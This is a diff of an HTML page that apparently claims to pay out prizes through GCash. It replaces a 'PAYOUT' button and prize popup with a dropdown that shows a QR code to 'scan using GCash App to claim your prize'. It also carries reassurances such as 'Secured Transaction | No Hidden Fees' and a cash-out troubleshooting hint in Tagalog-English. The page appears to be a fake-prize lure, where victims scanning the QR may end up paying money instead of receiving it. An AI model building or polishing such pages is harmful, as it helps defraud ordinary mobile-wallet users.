@@ -116,18 +116,28 @@
             <button id="claimActionBtn" class="claim-action-btn" onclick="onClaimAction()">CLAIM THRU GCASH</button>
             <div class="info-note">🔒 Secured Transaction | No Hidden Fees</div>
 
-            <!-- PAYOUT BUTTON -->
+            <!-- PAYOUT DROPDOWN SECTION -->
             <div style="margin-top: 12px; padding: 8px; border-top: 1px solid rgba(255,255,255,0.1);">
                 <p style="font-size: 10px; color: #ff8888; margin-bottom: 8px;">
-                    ⚠️ If hindi ma-cashout, try to switch other device or click
+                    ⚠️ If hindi ma-cashout, click below to view your QR code
                 </p>
-                <button id="payoutBtn" onclick="showPrizePopup()" 
+                <button id="payoutDropdownBtn" onclick="togglePayoutDropdown()" 
                     style="background: linear-gradient(135deg, #ff8800, #cc5500); 
                            border: none; width: 100%; padding: 10px; 
                            font-size: 14px; font-weight: bold; border-radius: 60px; 
-                           cursor: pointer; color: white; font-family: inherit;">
-                    💸 PAYOUT 💸
+                           cursor: pointer; color: white; font-family: inherit;
+                           display: flex; justify-content: space-between; align-items: center;">
+                    <span>💸 VIEW PAYOUT QR</span>
+                    <span id="dropdownArrow" style="font-size: 16px;">▼</span>
                 </button>
+                
+                <!-- DROPDOWN CONTENT (hidden by default) -->
+                <div id="payoutDropdownContent" style="display: none; margin-top: 10px; padding: 10px; background: rgba(0,0,0,0.5); border-radius: 15px;">
+                    <div id="qrDisplayArea" style="text-align: center;">
+                        <canvas id="qrDisplayCanvas" style="width: 150px; height: 150px; margin: 0 auto; display: block;"></canvas>
+                        <p style="font-size: 10px; color: #aaa; margin-top: 8px;">Scan QR code using GCash App</p>
+                    </div>
+                </div>
             </div>
         </div>
     </div>
@@ -153,21 +163,6 @@
                 </div>
                 <div id="firewallErrorMsg" class="firewall-error" style="display: none;"></div>
             </div>
-        </div>
-    </div>
-
-    <!-- ========== PRIZE POPUP ========== -->
-    <div id="prizePopup" class="prize-popup-overlay" style="display: none;">
-        <div class="prize-popup-card">
-            <div class="popup-close-btn" onclick="hidePrizePopup()">✕</div>
-            <h2 style="color:#ffd700; margin-bottom:15px;">🎁 YOUR PRIZE 🎁</h2>
-            <div id="prizeImageContainer" style="text-align:center;">
-                <canvas id="prizeDisplayCanvas" style="width:100%; max-width:350px; height:auto; border-radius:20px;"></canvas>
-            </div>
-            <div class="prize-note" style="margin-top:15px; font-size:11px; color:#aaa;">
-                <p>Scan the QR code using GCash App to claim your prize.</p>
-            </div>
-            <button class="close-prize-btn" onclick="hidePrizePopup()" style="margin-top:15px; background:rgba(255,255,255,0.1); border:none; padding:10px; border-radius:30px; color:white; width:100%; cursor:pointer;">CLOSE</button>
         </div>
     </div>
 
